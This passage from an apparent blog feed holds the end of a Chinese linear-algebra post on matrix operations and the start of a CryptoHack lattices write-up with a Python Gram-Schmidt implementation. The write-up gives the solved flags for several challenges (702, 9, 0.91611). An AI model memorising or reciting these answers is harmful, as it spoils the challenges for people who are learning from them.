mode=display">\begin{array}{l}\mathbf{AB}=\begin{bmatrix}n\end{bmatrix}_{1×1}\\\mathbf{BA}=\begin{bmatrix}1&\dots&1\\\vdots&\ddots&\vdots\\1&\dots&1\end{bmatrix}_{n×n}\end{array}</script></blockquote><p>通过上面两个例子有如下</p><blockquote><p><strong>定义5</strong>：</p><p>定义矩阵中数都为<code>1</code>的矩阵为$\mathbf{J}$，即$\mathbf{J:=}\begin{bmatrix}1&amp;\dots&amp;1\<br>\vdots&amp;\ddots&amp;\vdots\<br>1&amp;\dots&amp;1<br>\end{bmatrix}$</p><p><strong>性质1</strong>：矩阵乘法运算律</p><ol><li>$\mathbf{(AB)C}=\mathbf{A(BC)}$，结合律，如果A、B、C能够相乘</li><li>$\mathbf{A(B+C)}=\mathbf{AB+AC}$，左分配律</li><li>$\mathbf{(B+C)D}=\mathbf{BD+CD}$</li><li>定义$\mathbf{I<em>n:=}\begin{bmatrix}1&amp;0&amp;\dots&amp;0&amp;0\0&amp;1&amp;\dots&amp;0&amp;0\\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots\0&amp;0&amp;\dots&amp;1&amp;0\0&amp;0&amp;\dots&amp;0&amp;1\end{bmatrix}$，$\mathbf{I_n}$称为n级单位矩阵，则有$A</em>{s×n}I<em>{n}=A</em>{s×n}$，$I<em>sA</em>{s×n}=A_{s×n}$。特别地：若$\mathbf{A}$是n级矩阵，则$IA=AI=A$</li></ol><p><strong>性质2</strong>：矩阵乘法与数乘</p><ol><li>$k\mathbf{(AB)}=\mathbf{(kA)B}=\mathbf{A(kB)}$</li></ol></blockquote><h2 id="矩阵的幂"><a href="#矩阵的幂" class="headerlink" title="矩阵的幂"></a>矩阵的幂</h2><blockquote><p><strong>定义1</strong>：矩阵的幂</p><p>$\mathbf{A^m:=}A…A$。一共m个A相乘，$m\in N^{*}$。</p><p>$\mathbf{A^{0}}:=I$</p><p>容易得到：</p><ol><li>$\mathbf{A^{k}·A^{l}}=A^{k+l}$，其中$k,l\in N$</li><li>$\mathbf{(A^{k})^{l}}=\mathbf{A^{kl}}$，其中$k,l\in N$</li></ol></blockquote><h2 id="矩阵的转置"><a href="#矩阵的转置" class="headerlink" title="矩阵的转置"></a>矩阵的转置</h2><blockquote><p><strong>性质</strong>：矩阵的转置与矩阵乘积的转置</p><ol><li>$\mathbf{(A+B)}’=\mathbf{A’}+\mathbf{B’}$</li><li>$\mathbf{(kA)’}=\mathbf{kA’}$</li><li>$\mathbf{(AB)’}=B’A’$</li></ol></blockquote><h2 id="乘积矩阵的秩"><a href="#乘积矩阵的秩" class="headerlink" title="乘积矩阵的秩"></a>乘积矩阵的秩</h2><blockquote><p><strong>定理1</strong>：</p><p>设矩阵$A,B$二者可以相乘，那么就有$rank(\mathbf{AB})≤min{rank(\mathbf{A}),rank(\mathbf{B})}$</p></blockquote><p>引入与证明如下：</p><h1 id="特殊矩阵"><a href="#特殊矩阵" class="headerlink" title="特殊矩阵"></a>特殊矩阵</h1><h2 id="基本矩阵"><a href="#基本矩阵" class="headerlink" title="基本矩阵"></a>基本矩阵</h2><blockquote><p><strong>基本矩阵的定义</strong>：</p><p>形如如下的矩阵都被称为基本矩阵，矩阵这个数表中只有一个元素是<code>1</code>，其余元素都是<code>0</code>，使用$\mathbf{E_{ij}}$来表示，其中$i=1,…,s$；$j=1,…,n$：</p><script type="math/tex; mode=display">E_{ij}:=\begin{bmatrix}0&0&\dots&0&0\\0&0&\dots&0&0\\0&0&\ddots&1_{ij}&0\\0&0&\dots&0&0\\0&0&\dots&0&0\\\end{bmatrix}_{s×n}</script><p><strong>定理1</strong>：任意矩阵使用基本矩阵表示</p><p>任取$\mathbf{A}\in M_{s×n}(K)$，则有如下</p><script type="math/tex; mode=display">A=\begin{bmatrix}a_{11}&\dots&a_{1n}\\ \vdots&\ddots&\vdots \\a_{s1}&\dots&a_{sn}\end{bmatrix}=\begin{bmatrix}a_{11}&\dots&0\\\vdots&\ddots&\vdots\\0&\dots&0\end{bmatrix}+...+\begin{bmatrix}0&\dots&a_{1n}\\\vdots&\ddots&\vdots\\0&\dots&0\end{bmatrix}+...+\begin{bmatrix}0&\dots&0\\\vdots&\ddots&\vdots\\a_{s1}&\dots&0\end{bmatrix}+...+\begin{bmatrix}0&\dots&0\\\vdots&\ddots&\vdots\\0&\dots&a_{sn}\end{bmatrix}</script><p>那么就有：$A=a<em>{11}E</em>{11}+…+a<em>{1n}E</em>{1n}+…+a<em>{s1}E</em>{s1}+…+a<em>{sn}E</em>{sn}$</p><p><strong>定理2</strong>：基本矩阵构成一个基与对应的维数<br>设$k<em>{11}E</em>{11}+…+k<em>{1n}E</em>{1n}+…+k<em>{s1}E</em>{s1}+…+k<em>{sn}E</em>{sn}=\mathbf{0}$，则有$\begin{bmatrix}k<em>{11}&amp;…&amp;k</em>{1n}\ \vdots &amp;\ddots&amp;\vdots\ k<em>{s1}&amp;\dots&amp;k</em>{sn}\end{bmatrix}=\mathbf{0}$。</p><p>从而得到$k<em>{11}=…=k</em>{1n}=…=k<em>{s1}=…=k</em>{sn}=0$。</p><p>于是就有$\mathbf{E<em>{11},…,E</em>{1n},E<em>{21},…,E</em>{2n},E<em>{s1},…,E</em>{sn}}$线性无关，因此$\mathbf{E<em>{11},…,E</em>{1n},E<em>{21},…,E</em>{2n},E<em>{s1},…,E</em>{sn}}$是$\mathbf{M_{s×n}(K)}$的一个基。</p><p>因此$~dim~M<em>{s×n}(K)=sn$，特别地$~dim~M</em>{n}(K)=n^{2}$</p></blockquote><h2 id="对角矩阵"><a href="#对角矩阵" class="headerlink" title="对角矩阵"></a>对角矩阵</h2><blockquote><p><strong>对角矩阵的定义</strong>：</p><p>主对角线以外的元素全为0的方阵称为<strong>对角矩阵</strong>，简记作$diag{d_1,d_2,…,d_n}$，形如如下的矩阵：</p><script type="math/tex; mode=display">\begin{bmatrix}d_1&0&\dots&0&0\\0&d_2&\dots&0&0\\0&0&\ddots&d_{n-1}&0\\0&0&\dots&0&d_n\end{bmatrix}</script><p><strong>定理1</strong>：</p></blockquote><h2 id="数量矩阵"><a href="#数量矩阵" class="headerlink" title="数量矩阵"></a>数量矩阵</h2><h2 id="上-下三角矩阵"><a href="#上、下三角矩阵" class="headerlink" title="上、下三角矩阵"></a>上、下三角矩阵</h2><h2 id="初等矩阵"><a href="#初等矩阵" class="headerlink" title="初等矩阵"></a>初等矩阵</h2><h1 id="可逆矩阵"><a href="#可逆矩阵" class="headerlink" title="可逆矩阵"></a>可逆矩阵</h1><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><h2 id="矩阵的基本运算练习"><a href="#矩阵的基本运算练习" class="headerlink" title="矩阵的基本运算练习"></a>矩阵的基本运算练习</h2><h3 id="4-1典型例题1-5"><a href="#4-1典型例题1-5" class="headerlink" title="4-1典型例题1-5"></a>4-1典型例题1-5</h3><ul><li>例1：</li></ul><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201145412431.png" alt="image-20251201145412431"></p><ul><li>例2：</li></ul><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201145425332.png" alt="image-20251201145425332"></p><ul><li>例3、例4：</li></ul><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201145442043.png" alt="image-20251201145442043"></p><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201145454606.png" alt="image-20251201145454606"></p><ul><li>例5：</li></ul><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201145540017.png" alt="image-20251201145540017"></p><h3 id="4-1典型例题6-10"><a href="#4-1典型例题6-10" class="headerlink" title="4-1典型例题6-10"></a>4-1典型例题6-10</h3><ul><li>例6：</li></ul><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201145618304.png" alt="image-20251201145618304"></p><ul><li>例7：</li></ul><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201145628619.png" alt="image-20251201145628619"></p><ul><li>例8：</li></ul><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201145637912.png" alt="image-20251201145637912"></p><ul><li>例9：</li></ul><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201145702539.png" alt="image-20251201145702539"></p><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201145711075.png" alt="image-20251201145711075"></p><ul><li>例10：</li></ul><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201145719112.png" alt="image-20251201145719112"></p><h3 id="4-1典型例题11-12"><a href="#4-1典型例题11-12" class="headerlink" title="4-1典型例题11-12"></a>4-1典型例题11-12</h3><ul><li>例11：</li></ul><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201145904079.png" alt="image-20251201145904079"></p><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201145917455.png" alt="image-20251201145917455"></p><ul><li>例12：</li></ul><p><img src="/2025/11/25/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E8%BF%90%E7%AE%97/image-20251201145927085.png" alt="image-20251201145927085"></p><h3 id="4-1习题"><a href="#4-1习题" class="headerlink" title="4-1习题"></a>4-1习题</h3>]]></content>
    
    
    <summary type="html">前言：线性空间看了好久终于是看完了。</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="高等代数" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>cryptohack_lattices</title>
    <link href="http://iyheart.github.io/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/"/>
    <id>http://iyheart.github.io/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/</id>
    <published>2025-11-25T02:11:17.000Z</published>
    <updated>2025-12-23T14:22:01.107Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lattices"><a href="#Lattices" class="headerlink" title="Lattices"></a>Lattices</h1><h2 id="题目1_vectors"><a href="#题目1-Vectors" class="headerlink" title="题目1_Vectors"></a>题目1_Vectors</h2><p>题目描述如下：</p><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251124145653963.png" alt="image-20251124145653963"></p><p>将其翻译后如下：</p><ul><li>在定义一个格或者谈论格在密码学中出现的作用之前，先来复习一下线性代数与基相关的知识。</li><li>下面的挑战应该被视为复习，如果下面的知识对你来说是全新的，你可能需要做一些背景阅读。</li><li>通常，我们推荐<code>Hoffstein, Pipher, Silverman</code>所写的<code>《An Introduction to Mathematical Cryptography》</code>这本书，以及这个<code>pdf</code>文档和他们的应用<a href="https://web.archive.org/web/20220508113525/https://www.cryptool.org/download/ctb/CTB-Chapter_Lattice-Introduction_en.pdf">Wayback Machine</a></li></ul><p>下面进入复习阶段：</p><ul><li><p>一个在域$F$的向量空间$\mathbf{V}$，定义向量的二元运算。一个向量$v\in V$以及一个数$a\in F$，两个向量的加法和标量乘法如下：</p><ul><li>对于向量的加法：$v+w=z$，其中$v,w,z\in V$。</li><li>对于数量乘法，是域$F$中的一个数与向量空间的一个向量相乘，结果仍然是一个向量：$a*v=w$，$v,w\in V,a\in F$</li></ul></li><li><p>你可能第一次见到向量是在二维向量空间中，以及实数域定义的。我们也将用二维向量空间以及实数域来举一个例子：</p><ul><li>考虑一个二维的向量空间：$v\in V$其坐标为$v=(a,b)$，其中$a,b\in R$。</li><li>该二维向量空间的加法为：$(a,b)+(c,d)=(a+c,b+d)$</li><li>该二维向量空间的数乘运算为：$c<em>\mathbf{v}=c</em>(a,b)=(ca,cb)$</li></ul></li><li><p>除了向量的加法与数乘运算之外，还定义了内积（也称为点积），也就是两个向量相乘结果返回一个数。如下所示：</p><ul><li>$\mathbf{v·w}=a$，对于$v,w\in V,a\in F$。</li><li>在二维空间中的例子就为：$v·w=(a,b)·(c,d)=ac+bd$</li></ul></li><li><p>接下来做一题，该题是实数域下的三维向量空间中向量的<code>加法</code>、<code>数乘</code>、<code>内积</code>混合运算，题目如下，flag为计算出的结果没有东西包裹：</p></li></ul><script type="math/tex; mode=display">v=(2,6,3),w=(1,0,0),u=(7,7,2)\\3*(2*v-w)·2*u=?</script><ul><li>接下来就是计算过程：</li></ul><script type="math/tex; mode=display">\begin{array}{l}6*[(4,12,6)-(1,0,0)]·(7,7,2)\\= 6*(3,12,6)·(7,7,2) \\= 6*(3*7+12*7+6*2) \\= 6*117\\=702\end{array}</script><ul><li>所以本题的答案为：<code>702</code></li></ul><h2 id="题目2_size-and-basis"><a href="#题目2-Size-and-Basis" class="headerlink" title="题目2_Size and Basis"></a>题目2_Size and Basis</h2><p>题目描述如下：</p><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251124152819566.png" alt="image-20251124152819566"></p><p>翻译过来如下：</p><ul><li>我们说一个向量集合$v_1,v_2,…,v_k\in V$满足方程$a_1\mathbf{v_1}+a_2\mathbf{v_2}+…+a_k\mathbf{v_k}=\mathbf{0}$的解如果只有$a_1=a_2=…=a_k=0$，那么就说这组向量是线性无关的。</li><li>为了更直观体现，想象一个向量从一个点出发。给定一组线性无关的向量，返回原点的唯一方法是沿原向量移动。其他向量不论经过多少加法运算和数乘运算都不会回到这个点。</li><li>向量空间的基就是一组线性无关向量的集合$v_1,v_2,…,v_n\in V$，使得$w\in V$能被写成如下形式：</li></ul><script type="math/tex; mode=display">w = a_1\mathbf{v_1}+a_2\mathbf{v_2}+...+a_k\mathbf{v_n}</script><ul><li>向量空间的基中向量的个数也就是线性空间的维数，记作$dim~V$。</li><li>我们定义向量的一个大小，记为$||v||$，利用向量与自身的内积,$||v||^{2}=v·v$。</li><li>对于向量空间的一个基$v_1,v_2,…,v_n\in~V$，任意两个不同向量之间的内积为零：$v_i·v_j=0,i≠j$，则我们称这个基为<strong>正交基</strong></li><li>对于一个正交基来说，所有基向量$||v_i||=1$，那么就称该正交基为单位正交基。</li></ul><p>接下来就是本题的尝试：</p><p>计算向量$v=(4,6,2,5)$的长度，flag的值就是这个向量的长度。</p><script type="math/tex; mode=display">\begin{array}{l}||v||^{2}\\=v·v\\=(4,6,2,5)·(4,6,2,5)\\=16+36+4+25\\=16+4+36+25\\=20+36+25\\=20+61\\=81\end{array}</script><ul><li>所以最终答案为：<code>9</code></li></ul><h2 id="题目3_gram-schmidt"><a href="#题目3-Gram-Schmidt" class="headerlink" title="题目3_Gram Schmidt"></a>题目3_Gram Schmidt</h2><p>本题是介绍斯密特正交化，也就是将一个给定的基（可能是正交基，可能不是正交基），将该基转化成一个正交基。如果需要转化成单位正交基，还需要对该正交基进行归一化处理。</p><p>题目描述如下：</p><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251124155744633.png" alt="image-20251124155744633"></p><p>翻译过来就如下所示：</p><ul><li>在上一个挑战中，我们了解到了一个被称为<strong>正交基</strong>的一个特别的基。给出向量空间中一个基$v_1,v_2,…,v_n\in V$，通过斯密特正交化算法可以计算出一个正交化的基$u_1,u_2,…,u_n \in V$</li><li>在<code>Jeffrey Hoffstein, Jill Pipher, Joseph H. Silverman</code>所写的书<code>《An Introduction to Mathematical Cryptography》</code>，斯密特正交化算法的伪代码如下所示：</li></ul><script type="math/tex; mode=display">\begin{array}{l}u_1=v_1\\Loop~i=2,3,...,n\\~~~~~~Compute~\mu_{ij}=\frac{v_i·u_j}{||u_i||^{2}},1≤j<i.\\~~~~~~Set~u_i=v_i-\mu_{ij}·u_{j}~(Sum~over~j~for~1≤j<i)\\End~Loop\end{array}</script><ul><li>接下来就是根据伪代码编写一个斯密特正交化的代码，并计算下面这个基的正交基，flag的值是$u_4$第二个分量，该分量是浮点型，保留5位小数：</li></ul><script type="math/tex; mode=display">v_1=(4,1,3,-1)~~~v_2=(2,1,-3,4)~~~v_3=(1,0,-2,7)~~v_4=(6,2,9,-5)</script><p>注意：这个算法不能创造一个正交基。但是如果要创建一个正交基只需要做一个很小的改动，想想需要改动什么。如果你使用的是别人的算法，如果flag是错误的，这个错误点就是问题的所在。但是如果算法没有问题，flag仍然错误，尝试一下四舍五入。</p><p>编写如下算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vec_multi</span>(<span class="params">u1:<span class="built_in">list</span>,v1:<span class="built_in">list</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param u1: 进行内积的向量之一</span></span><br><span class="line"><span class="string">    :param v1: 进行内积的向量之一</span></span><br><span class="line"><span class="string">    :return: 内积的结果,float或int类型</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    length = <span class="built_in">len</span>(u1)</span><br><span class="line">    <span class="keyword">assert</span> length == <span class="built_in">len</span>(v1) <span class="comment"># 判断两个向量必须是相同维数的</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        result += u1[i]*v1[i]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vec_add</span>(<span class="params">u1:<span class="built_in">list</span>,v1:<span class="built_in">list</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param u1: 进行向量加法的其中一个向量</span></span><br><span class="line"><span class="string">    :param v1: 进行向量加法的其中一个向量</span></span><br><span class="line"><span class="string">    :return: vec:list: 向量加法的结果</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    length = <span class="built_in">len</span>(u1)</span><br><span class="line">    <span class="keyword">assert</span> length == <span class="built_in">len</span>(v1) <span class="comment"># 判断两个向量必须是相同维数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        result.append(u1[i]+v1[i])</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vec_sub</span>(<span class="params">u1:<span class="built_in">list</span>,v1:<span class="built_in">list</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param u1: 被减向量</span></span><br><span class="line"><span class="string">    :param v1: 减向量</span></span><br><span class="line"><span class="string">    :return: vec:list: 向量减法的结果</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    length = <span class="built_in">len</span>(u1)</span><br><span class="line">    <span class="keyword">assert</span> length == <span class="built_in">len</span>(v1) <span class="comment"># 判断两个向量必须是相同维数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        result.append(u1[i]-v1[i])</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vec_times</span>(<span class="params">k:<span class="built_in">int</span> <span class="keyword">or</span> <span class="built_in">float</span>,u1</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param k: 数乘的值</span></span><br><span class="line"><span class="string">    :param u1: 数乘向量</span></span><br><span class="line"><span class="string">    :return: vec: 返回结果向量</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(u1)):</span><br><span class="line">        result.append(k*u1[i])</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Gram_Schmidt</span>(<span class="params">vec:<span class="built_in">list</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数实现的是斯密特正交化</span></span><br><span class="line"><span class="string">    :param vec: 传入的是一个基,并且是一个列表类型,两个行向量v1 = (1,2),v2 = (3,4);则传入[[1,2],[3,4]],列向量就转置成行向量再传入</span></span><br><span class="line"><span class="string">    :return: vec2 : 经过斯密特正交化后的一个正交基</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    vec2 = [] <span class="comment"># 保存正交基</span></span><br><span class="line">    vec2.append(vec[<span class="number">0</span>]) <span class="comment"># 将vec[0]加入正交基中</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(vec)):</span><br><span class="line">        mu_list = []  <span class="comment"># 用于存放mu_ij的结果</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">            mu = vec_multi(vec[i],vec2[j])/vec_multi(vec2[j],vec2[j])</span><br><span class="line">            mu_list.append(mu)</span><br><span class="line">        temp = vec_sub(vec[i], vec_times(mu_list[<span class="number">0</span>], vec2[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(vec2)):</span><br><span class="line">            temp = vec_sub(temp,vec_times(mu_list[k],vec2[k]))</span><br><span class="line">        vec2.append(temp)</span><br><span class="line">    <span class="keyword">return</span> vec2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vec = []</span><br><span class="line">v1 = [<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>,-<span class="number">1</span>]</span><br><span class="line">v2 = [<span class="number">2</span>,<span class="number">1</span>,-<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">v3 = [<span class="number">1</span>,<span class="number">0</span>,-<span class="number">2</span>,<span class="number">7</span>]</span><br><span class="line">v4 = [<span class="number">6</span>,<span class="number">2</span>,<span class="number">9</span>,-<span class="number">5</span>]</span><br><span class="line">vec.append(v1)</span><br><span class="line">vec.append(v2)</span><br><span class="line">vec.append(v3)</span><br><span class="line">vec.append(v4)</span><br><span class="line">result = Gram_Schmidt(vec)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[[4, 1, 3, -1], [2.5925925925925926, 1.1481481481481481, -2.5555555555555554, 3.851851851851852], [-0.7229219143576828, -1.0201511335012596, 2.012594458438287, 2.1259445843828715], [-0.3619189659458126, 0.916107382550335, 0.21488938603032665, 0.11309967685806738]]</span></span><br><span class="line"><span class="string">得到的结果是：0.916107382550335,保留五位有效数字就为:0.91611</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>所以flag为：<code>0.91611</code></li></ul><h2 id="题目4_whats-a-lattice"><a href="#题目4-What’s-a-Lattice" class="headerlink" title="题目4_What’s a Lattice?"></a>题目4_What’s a Lattice?</h2><p>本题正式介绍格，题目描述如下：</p><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251124182427829.png" alt="image-20251124182427829"></p><p>翻译过来就如下：</p><ul><li>我们现在准备开始讨论格。有一个线性无关向量组$v_1,v_2,…,v_n\in ~R^{m}$，格$L$是线性无关向量组$v_1,v_2,…,v_n$所创建的，并且这些向量的系数都是整数</li></ul><script type="math/tex; mode=display">L = a_1·v_1+a_2·v_2+...+a_k·v_k:a_1,a_2,...,a_n\in \Z</script><ul><li>格$L$的基是任何能够创建出格$L$的线性无关向量组。因此基并不是独特的。如下图所示，展现了一个二维的格以及这个格的两个基$u_1、u_2$以及$v_1、v_2$。</li></ul><p><img src="/2025/11/25/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/crypto_hack/cryptohack-lattices/image-20251124183609659.png" alt="image-20251124183609659"></p><ul><li>使用一个基，我们能通过基向量的整数倍，到达格中的任一一点，基向量还定义了基本域，基本域定义如下：</li></ul><script type="math/tex; 